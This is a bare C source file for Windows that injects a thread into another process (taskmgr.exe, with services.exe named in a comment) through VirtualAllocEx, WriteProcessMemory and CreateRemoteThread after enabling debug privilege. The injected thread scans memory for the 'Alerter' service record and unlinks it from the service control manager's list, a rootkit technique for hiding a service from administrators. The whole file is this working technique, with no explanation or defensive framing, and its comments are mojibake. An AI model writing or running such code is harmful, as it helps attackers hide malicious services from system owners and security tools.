#include <stdio.h>
#include <assert.h>
#include <windows.h>
#include <tlhelp32.h>

typedef struct _FAKE_SERVICE_RECORD { 
    struct _FAKE_SERVICE_RECORD  *Prev;          // linked list 
    struct _FAKE_SERVICE_RECORD  *Next;          // linked list 
    LPWSTR                  ServiceName;    // points to service name 
    LPWSTR                  DisplayName;    // 
} FAKE_SERVICE_RECORD, *PFAKE_SERVICE_RECORD, *LPFAKE_SERVICE_RECORD; 

typedef struct _RemotePara{
   wchar_t svcname[50];
   DWORD pwcscmp;

}RemotePara;

typedef int (__cdecl *Pwcscmp)(const unsigned short *, const unsigned short *);


int PName2PID(char *PName)
{
	DWORD pid=0;
	int i=0;
	HANDLE hSnapshot = NULL;
	hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapshot,&pe);
	do
	{
		if(stricmp(pe.szExeFile,PName)==0)
		{	
			pid = pe.th32ProcessID;
			break;
		}
	}
	while(Process32Next(hSnapshot,&pe)==TRUE);
	CloseHandle (hSnapshot);
	return pid;
}

void EnableDebugPriv( void )
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if ( ! OpenProcessToken( GetCurrentProcess(),
	TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		return;
	if ( ! LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &sedebugnameValue ) ){
		CloseHandle( hToken );
		return;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if ( ! AdjustTokenPrivileges( hToken, FALSE, &tkp, sizeof tkp, NULL, NULL ) )
		CloseHandle( hToken );
}

void out(char *w)
{
	printf("%s\n",w);
}

DWORD __stdcall RemoteThread(RemotePara *lpPara)
{

   Pwcscmp mywcscmp = (Pwcscmp) lpPara->pwcscmp ;//�õ�������ڵ�ַ
   if(!mywcscmp)
	   return 0;
   int i; 
   for (i = 0x300000;i<0x5000000;i+=4){ 
    __try{ 
     if (0 == mywcscmp((const unsigned short *)i,lpPara->svcname)){ 

int ii; 
for (ii = 0x300000;ii<0x5000000;ii+=4){ 

  __try{ 
   if (i == *(ULONG*)ii){ 

    if (0 == mywcscmp((const unsigned short *)(*(ULONG*)(ii+4)), lpPara->svcname)){ 
     //found the right one 
     PFAKE_SERVICE_RECORD pRecord; 
     pRecord = (PFAKE_SERVICE_RECORD)(ii-8); 
     *((DWORD*)pRecord->Prev+1) = (DWORD)(pRecord->Next); 
     *((DWORD*)pRecord->Next) = (DWORD)(pRecord->Prev); 
	 //pRecord->Prev->Next = pRecord->Next;
	 //pRecord->Next->Prev = pRecord->Prev;

     } 
   } 
  } 
  __except(EXCEPTION_EXECUTE_HANDLER ){ 
   //printf("error\n"); 
   ii-=4; 
   ii += 0x1000; 
   //_getche(); 
  } 
} 
     } 
    } 
    __except(EXCEPTION_EXECUTE_HANDLER ){ 
     //printf("error\n"); 
     i-=4; 
     i += 0x1000; 
     //_getche(); 
    } 
   } 

	return 0;
}
int main(int argc, char* argv[])
{
	EnableDebugPriv();
	int pid=PName2PID("taskmgr.exe");//services.exe

	DWORD nbyteswrite;
	HANDLE ph=OpenProcess(PROCESS_CREATE_THREAD | //����Զ�̴����߳�
		PROCESS_VM_OPERATION | //����Զ��VM����
		PROCESS_VM_WRITE |  //����Զ��VMд
		PROCESS_VM_READ,    //����Զ��VM��
		FALSE, pid);
	if(!ph) 
	{
		out("ph");
		return false;
	}
	const DWORD THREADSIZE=1024*50;
	void *pRemoteThread =::VirtualAllocEx(ph, 0,THREADSIZE,MEM_COMMIT| MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if(!pRemoteThread)
	{
		out("pRemoteThread");
		return false;
	}
	if(!::WriteProcessMemory(ph,pRemoteThread,&RemoteThread,THREADSIZE,&nbyteswrite))
	{
		out("WriteProcessMemory");
		return false;
	}
	RemotePara myRemotePara;

	ZeroMemory(&myRemotePara,sizeof(RemotePara));
	wcscpy(myRemotePara.svcname, L"Alerter");
	HINSTANCE hMSVCRT = ::LoadLibrary ("ntdll.dll");
	myRemotePara.pwcscmp =(DWORD) ::GetProcAddress (hMSVCRT , "wcscmp");
	if(!myRemotePara.pwcscmp)
	{
		out("GetProcAddress wcscmp");
		return false;
	}
	void *pRemotePara =::VirtualAllocEx (ph ,0,sizeof(RemotePara),MEM_COMMIT,PAGE_READWRITE);//ע������ռ�ʱ��ҳ������
	if(!pRemotePara)
	{
		out("pRemotePara");
		return false;
	}
	if(!::WriteProcessMemory (ph ,pRemotePara,&myRemotePara,sizeof myRemotePara, &nbyteswrite))
	{
		out("WriteProcessMemory pRemotePara");
		return false;
	}
	DWORD byte_write;
	HANDLE hThread = ::CreateRemoteThread (ph ,0,0,(LPTHREAD_START_ROUTINE)pRemoteThread ,pRemotePara,0,&byte_write);
	if(!hThread)
	{
		return 0;
	}else
	{
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
    return 0;
}
